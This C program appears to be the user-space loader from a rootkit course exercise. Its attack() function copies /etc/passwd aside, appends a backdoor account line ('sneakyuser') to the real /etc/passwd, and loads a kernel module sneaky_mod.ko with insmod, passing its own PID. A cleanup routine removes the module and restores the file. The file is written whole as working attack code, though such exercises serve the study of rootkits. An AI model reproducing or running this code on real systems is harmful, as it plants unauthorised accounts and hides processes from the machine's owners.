#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h> 
#include <fcntl.h>
#include <unistd.h>
//#include <linux/module.h>

// Constants
#define PASSWD_FILE "/etc/passwd"
#define TMP_PASSWD_FILE "/tmp/passwd"
#define PASSWD_LINE "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash"

/*                                                                                                                                                                    
 * 1) copy etc/passwd file to a new file tmp/passwd
 */
int copy_file(char* src, char* dst) {
  int src_fd, dest_fd;
  int err;
  unsigned char buffer[4096];

  src_fd = open(src, O_RDONLY);
  dest_fd = open(dst, O_CREAT | O_WRONLY | O_TRUNC, 0600);

  if ((0 > src_fd) || (0 > dest_fd)) {
    printf("Failed to open src %d or dst %d\n", src_fd, dest_fd);
    return (-1);
  }
  while (1) {
    err = read(src_fd, buffer, sizeof(buffer));
    if (err == -1) {
      printf("Error reading file \n");
      break;
    } else if (0 == err) {
      break;
    }

    err = write(dest_fd, buffer, err);
    if (err == -1) {
      printf("Error writing to file \n");
      break;
    }
  }

  close(src_fd);
  close(dest_fd);
  return (err);
}

int append_line(char* file, const char* line)
{
  //1b) open  etc/passwd in append mode, now paste a line of code to it
  FILE * fd = fopen(file, "a");

  if(fd == NULL) {
    printf("Error opening file.\n");
    return (-1);
  } else {
    fprintf(fd, "%s", line);
  }
  fclose (fd);
  return (0);
}

void execute(char **argv) {
  pid_t pid;
  int status;

  if ((pid = fork()) < 0) { /* fork a child process           */
    printf("*** ERROR: forking child process failed\n");
  } else if (pid == 0) { /* for the child process:         */
    int err;
    err = execvp(argv[0], argv);
    if (err < 0) { /* execute the command  */
      printf("*** ERROR: exec failed %d errno %d\n", err, errno);
      exit(1);
    }
  } else { /* for the parent:      */
    while (wait(&status) != pid)
      /* wait for completion  */
      ;
    printf("Child process completed.\n");
  }
}

int attack()
{
  char *argv[4];
  char pid[128];
  // 1.a
  if (0 > copy_file(PASSWD_FILE, TMP_PASSWD_FILE)) {
    printf("Failed to copy password file, exiting...\n");
    return (-1);
  }

  // 1.b
  if (0 > append_line(PASSWD_FILE, PASSWD_LINE)) {
    printf("Failed to add password line, exiting...\n");
    return (-1);
  }

  argv[0] = "insmod";
  argv[1] = "sneaky_mod.ko";
  snprintf(pid, sizeof(pid), "sneaky_pid=%d", getpid());
  argv[2] = pid;
  argv[3] = NULL;

  execute(argv);
  return (0);
}

void cleanup()
{
  char *argv[3];

  // Remove kernel module
  argv[0] = "rmmod";
  argv[1] = "sneaky_mod.ko";
  argv[2] = NULL;
  execute(argv);

  // copy the password file back
  if (0 > copy_file(TMP_PASSWD_FILE, PASSWD_FILE)) {
    printf("Failed to copy password file back.\n");
  }
}

int main (int argc , char* argv[]){
  printf("Sneaky process pid = %d \n", getpid());

  if (-1 == attack()) {
    exit(1);
  }

  while (1) {
    char input_c;
    printf("SneakyShell: ");
    input_c = getchar();
    printf("\n");
    if (input_c == 'q') { //exit if user enters q
      cleanup();
      printf("Exiting SneakyShell.\n");
      break;
    }
  }
  return 0;
}
